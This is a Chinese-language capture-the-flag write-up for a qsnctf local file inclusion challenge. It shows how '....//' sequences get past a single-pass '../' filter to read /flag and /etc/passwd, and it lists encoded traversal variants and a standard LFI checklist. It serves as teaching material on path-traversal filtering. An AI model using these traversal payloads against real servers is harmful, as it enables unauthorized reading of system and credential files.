# WP｜qsnctf Directory Search（LFI + 点斜杠穿越）

> 靶机：http://challenge.qsnctf.com:40081/ ｜ 2026-08-11 实测
> 类型：文件包含 LFI / 目录穿越（`../` 过滤绕过）
> flag(实测)：`flag{dd62da2649e94f5fac16eff08bc06388}`

---

## 一、解题链

| 步骤 | 操作 | 结果 |
|---|---|---|
| 1. 找入口 | 页面两链接 `index.php?file=discussion1.txt` | `file` 参数 = LFI |
| 2. 探测 | `file=../../../../flag` | ❌ 无输出（`../` 被过滤） |
| 3. 探测 | `file=php://filter/...` | ❌ 无输出（`php://` 被过滤） |
| 4. 绕过 | `file=....//....//....//....//flag` | ✅ **flag{dd62da2649e94f5fac16eff08bc06388}** |
| 5. 验证 | `file=....//....//....//....//etc/passwd` | ✅ root:x:0:0:root（穿越通用） |

## 二、核心知识点：`....//` 绕过 `../` 过滤

```php
// 后端常见的过滤（删一次）：
$file = str_replace("../", "", $file);
// 或 preg_replace('/\.\.\//', '', $file);
```

输入 `....//flag`：
```
....//flag
  │  WAF 找 "../"（从第2个点开始看：. ../ /）→ 删掉
../flag          ← 剩下的还是 "../"！照样穿越
```

**原理**：`....//` 里藏着一个 `../`，WAF 删一次后还剩一个 `../`——**删除逻辑不循环删干净 = 绕过**。

同类变体（都是一个思路）：
```
....//....//....//....//flag   ← 本解（4 层到根）
..././flag                     ← 点+斜杠
..%2f..%2f..%2fflag            ← URL 编码斜杠
%2e%2e%2f%2e%2e%2fflag         ← 全编码
....\/....\/flag               ← 反斜杠
```

## 三、复盘套路

```
LFI 题标准流程：
  1. 找 file/include/require 参数 → 试读已知文件验证（discussion1.txt）
  2. 直接想读 /flag（根目录最常见）
  3. 被拦先分类：拦什么？（php://? ../? 关键字?）
  4. ../ 被拦 → 点斜杠变体矩阵（....//、%2e%2e%2f、..././）
  5. php://filter 被拦 → 直接穿越读文件本体，不用读源码
```
